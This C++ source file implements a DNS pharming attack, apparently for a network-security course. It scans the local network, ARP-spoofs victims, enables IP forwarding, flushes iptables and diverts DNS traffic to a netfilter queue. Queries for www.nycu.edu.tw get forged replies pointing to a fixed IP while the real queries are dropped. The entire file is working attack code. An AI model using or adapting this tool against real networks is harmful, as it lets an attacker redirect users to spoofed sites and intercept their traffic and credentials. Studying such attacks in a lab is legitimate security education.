#include "pharm_attack.hpp"
using namespace std;

void handle_signal(int sig) {
    FILE *fp = popen("iptables -F && iptables -F -t nat && sysctl net.ipv4.ip_forward=0 > /dev/null", "r");

    pclose(fp);
    exit(0);

}
std::string get_default_interface() {
    FILE *pipe = popen("ip route | awk '/default/ {print $5}'", "r");
    if (!pipe) {
        perror("Failed to open pipe for command execution.");
        return "";
    }

    char buffer[128];
    std::string result = "";
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            result += buffer;
        }
    }
    pclose(pipe);

    // Trim trailing newline character
    if (!result.empty() && result[result.length() - 1] == '\n') {
        result.erase(result.length() - 1);
    }

    return result;
}
void PHARM::sendUDP(char *original_data, int data_len) {
    int udp_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (udp_sockfd < 0) {
        perror("socket()");
        return;
    }

    // Create a packet_buffer
    array<char,1024> packet;
    struct ethhdr *eth = reinterpret_cast<struct ethhdr *>(packet.data());
    eth->h_proto = htons(ETH_P_IP);

    for(int i = 0; i < 6; i++){
        eth->h_source[i] = attacker_info.src_mac[i];
    }


    // get the destination IP from the original data
    struct iphdr *iph = reinterpret_cast<struct iphdr *>(original_data);
    IPAddress dest_ip_array;
    for(int i = 0; i < 4; i++){
        dest_ip_array[i] = reinterpret_cast<uint8_t*>(&iph->daddr)[i];
    }

    // transfer the destination IP to MAC and put in the packet
    auto it = victims.find(dest_ip_array);
    if (it == victims.end()) {
        perror("Destination IP not found in map");
        return;
    } else {
        for(int i = 0; i < 6; i++){
            eth->h_dest[i] = it->second[i];
        }
    }

    // put the original data in the packet
    memcpy(packet.data() + 14, original_data, data_len);

    if (bind(udp_sockfd, (struct sockaddr *)&device, sizeof(struct sockaddr_ll)) < 0) {
        perror("fail to bind in send UDP");
        exit(1);
    }

    if (sendto(udp_sockfd, packet.data(), data_len + 14, 0, (struct sockaddr *)&device, sizeof(device)) < 0) {
        perror("fail to sendto in send UDP");
        exit(1);
    }
    close(udp_sockfd);

    return;
}

uint16_t PHARM::cal_TCP_checksum(struct iphdr *iph, struct udphdr *udp, int total_length) {
    uint32_t checksum = 0;
    checksum += ntohs(iph->saddr >> 16); 
    checksum += ntohs(iph->saddr & 0xFFFF);
    checksum += ntohs(iph->daddr >> 16);
    checksum += ntohs(iph->daddr & 0xFFFF);

    checksum += 0x0011;  // UDP
    checksum += (total_length - iph->ihl * 4);
    int len_buf;
    if ((total_length - iph->ihl * 4) % 2 == 0) {
        len_buf = (total_length - iph->ihl * 4) / 2;
    } else {
        len_buf = (total_length - iph->ihl * 4) / 2 + 1;
    }
    auto data = reinterpret_cast<const uint16_t *>(udp);
    for (int i = 0; i < len_buf; i++) {
        checksum += ntohs(data[i]);
    }
    while (checksum >> 16) {
        checksum = (checksum >> 16) + (checksum & 0xFFFF);
    }
    return ~htons(checksum);
}

uint16_t PHARM::cal_IP_checksum(struct iphdr *ip_header) {
    uint32_t checksum = 0;
    auto data = reinterpret_cast<const uint16_t *>(ip_header);
    for (int i = 0; i < ip_header->ihl * 2; i++) {
        checksum += ntohs(data[i] & 0xFFFF);
    }
    while (checksum >> 16) {
        checksum = (checksum & 0xFFFF) + (checksum >> 16);
    }
    return ~htons(checksum);
}

void PHARM::reply_dns(unsigned char *received_payload, int payload_length, int query_length) {
    // Allocate memory for the modified DNS response
    char *response_data = new char[1024];
    
    // Copy the received payload to the response data
    memcpy(response_data, received_payload, payload_length);


    struct iphdr *ip_header = (struct iphdr *)response_data;

    // Swap source and destination IP addresses
    swap(ip_header->daddr, ip_header->saddr);
    ip_header->frag_off = 0;

    // Extract UDP header
    struct udphdr *udp_header = (struct udphdr *)(response_data + ip_header->ihl * 4);
    // Swap source and destination ports
    udp_header->dest = udp_header->source;
    udp_header->source = htons(53);

    // Extract DNS header
    struct dns_pkg *dns_header = (struct dns_pkg *)(response_data + ip_header->ihl * 4 + sizeof(struct udphdr));

    // Modify DNS header fields
    dns_header->Flags = htons(0x8180);
    dns_header->num_of_answer = htons(1);  // one answer only (140.113.24.241)
    dns_header->num_of_authority = htons(0);
    dns_header->num_of_additional = htons(0);

    // Calculate total length of modified response
    int total_length = ip_header->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dns_pkg) + query_length;
    
    // Add resource record to the response
    struct response_header *resource_record = (struct response_header *)(response_data + total_length);
    resource_record->name = htons(0xc00c);  // compress name
    resource_record->type = htons(1);       // A record
    resource_record->class_ = htons(1);        // IN internet
    resource_record->ttl = htonl(5);
    resource_record->len = htons(4);
    total_length += sizeof(struct response_header);
    // Add IP address to the resource record
    response_data[total_length] = 140;
    response_data[total_length + 1] = 113;
    response_data[total_length + 2] = 24;
    response_data[total_length + 3] = 241;
    total_length += 4;

    // Update UDP length and checksum
    udp_header->len = htons(total_length - ip_header->ihl * 4);
    udp_header->check = 0;
    udp_header->check = cal_TCP_checksum(ip_header, udp_header, total_length);

    // Update IP total length and checksum
    ip_header->tot_len = htons(total_length);
    ip_header->check = 0;
    ip_header->check = cal_IP_checksum(ip_header);

    // Send the modified DNS response
    sendUDP(response_data, total_length);
}


pair<string, int> PHARM::get_dns_name(const unsigned char *packet, int dns_start) {
    string dns_name;
    int dns_name_position = dns_start + sizeof(dns_pkg);
    int dns_name_length = 5;  // Include qry.type, qry.class, and final 0 in qname

    while (packet[dns_name_position] != 0) {
        int label_length = packet[dns_name_position];
        dns_name_length += label_length + 1;

        char label[label_length + 1];
        memcpy(label, &packet[dns_name_position + 1], label_length);
        label[label_length] = '\0';
        dns_name += label;

        dns_name_position += label_length + 1;
    }

    return {dns_name,dns_name_length};
}

int PHARM::process_nfq_package(struct nfq_q_handle *q_handle, struct nfgenmsg *nf_msg,
                           struct nfq_data *nfa, void *data) {
    
    PHARM *pharm = (PHARM *)data;

    struct nfqnl_msg_packet_hdr * packet_header = nfq_get_msg_packet_hdr(nfa);
    u_int32_t packet_id = 0;
    if (packet_header) {
        packet_id = ntohl(packet_header->packet_id);
    }
    unsigned char *packet;
    int packet_length = nfq_get_payload(nfa, &packet);
    if (packet_length < 0) {
        printf("Error: nfq_get_payload returned %d\n", packet_length);
        return nfq_set_verdict(q_handle, packet_id, NF_ACCEPT, 0, NULL);
    }
    // ip header
    struct iphdr *ip_header = (struct iphdr *)packet;
    // udp header
    struct udphdr *udp_header = (struct udphdr *)(packet + ip_header->ihl * 4);


    if (ntohs(udp_header->dest) != 53) {
        return nfq_set_verdict(q_handle, packet_id, NF_ACCEPT, 0, NULL);
    }
    
    auto  temp = pharm->get_dns_name(packet, ip_header->ihl * 4 + sizeof(struct udphdr));
    string dns_name = temp.first;
    int dns_name_length = temp.second;
    // cout << "DNS name: " << dns_name << endl;
    // cout << "naive: " << dns_name.size()+5 << endl;
    // cout << "DNS name length: " << dns_name_length << endl;

    if (dns_name == "wwwnycuedutw") {
        pharm->reply_dns(packet, packet_length, dns_name_length);
        return nfq_set_verdict(q_handle, packet_id, NF_DROP, 0, NULL);
    }else{
        return nfq_set_verdict(q_handle, packet_id, NF_ACCEPT, 0, NULL);
    }

    
}

void PHARM::implement_nfq() {
    struct nfq_handle *nfq_h = nfq_open();
    if (!nfq_h) {
        perror("nfq_open() failed");
        exit(1);
    }
    if (nfq_unbind_pf(nfq_h, AF_INET) < 0) {
        perror("nfq_unbind_pf() failed");
        exit(1);
    }
    if (nfq_bind_pf(nfq_h, AF_INET) < 0) {
        perror("nfq_bind_pf() failed");
        exit(1);
    }
    struct nfq_q_handle *nfq_q_h = nfq_create_queue(nfq_h, 0, &PHARM::process_nfq_package, this);
    if (!nfq_q_h) {
        perror("nfq_create_queue() failed");
        exit(1);
    }
    if (nfq_set_mode(nfq_q_h, NFQNL_COPY_PACKET, 0xffff) < 0) {
        perror("nfq_set_mode() failed");
        exit(1);
    }

    int nfq_sockfd = nfq_fd(nfq_h);
    char buffer[4096];
    while (true) {
        int received_bytes = recv(nfq_sockfd, buffer, sizeof(buffer), 0);
        if (received_bytes < 0) {
            perror("recv failed");
            break;
        }
        nfq_handle_packet(nfq_h, buffer, received_bytes);
    }
    nfq_destroy_queue(nfq_q_h);
    nfq_close(nfq_h);
}


PHARM::PHARM(char *interface) : Attacker(interface){
}

void PHARM::make_device(){
    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(interface);
    device.sll_family = AF_PACKET;
    device.sll_protocol = htons(ETH_P_IP);
    device.sll_pkttype = PACKET_BROADCAST;
    device.sll_hatype = htons(ARPHRD_ETHER);
    device.sll_halen = htons(6);
    for(int i = 0; i < 6; i++){
        device.sll_addr[i] = attacker_info.src_mac[i];
    }
}

int main(int argc, char **argv){
    if (geteuid() != 0) {
        cerr << "./pharm_attack: Permission denied" << endl;
        cerr << "Try sudo ./pharm_attack" << endl;
        return 1;
    }
    // if(argc != 2){ // Check if the user has provided the interface
    //     cerr << "Usage: " << argv[0] << " <interface>" << endl;
    //     return 1;
    // }
    char *interface = get_default_interface().data();
    cout << "Interface: " << interface << endl;
    signal(SIGINT, handle_signal);
    PHARM pharm(interface);
    pharm.make_device();
    // task 1
    cout << "Scanning the network..." << endl;
    pharm.scan();

    // task 2
    thread arp_spoof_thread(&PHARM::arp_spoof, &pharm);
    
    // Enable IP forwarding
    FILE *fp_sysctl = popen("sysctl net.ipv4.ip_forward=1 > /dev/null", "r");
    pclose(fp_sysctl);
    // Flush iptables rules
    FILE *fp_iptables1 = popen("iptables -F", "r");
    pclose(fp_iptables1);

    FILE *fp_iptables2 = popen("iptables -F -t nat", "r");
    pclose(fp_iptables2);

    // Add MASQUERADE rule
    string post_routing_cmd = "iptables -t nat -A POSTROUTING -o " + string(interface) + " -j MASQUERADE";
    FILE *fp_iptables3 = popen(post_routing_cmd.c_str(), "r");
    pclose(fp_iptables3);

    // Add NFQUEUE rules for DNS traffic
    FILE *fp_iptables4 = popen("iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0", "r");
    pclose(fp_iptables4);

    FILE *fp_iptables5 = popen("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0", "r");
    pclose(fp_iptables5);

    pharm.implement_nfq();


    arp_spoof_thread.join();    
    close(pharm.sockfd);
    return 0;
}
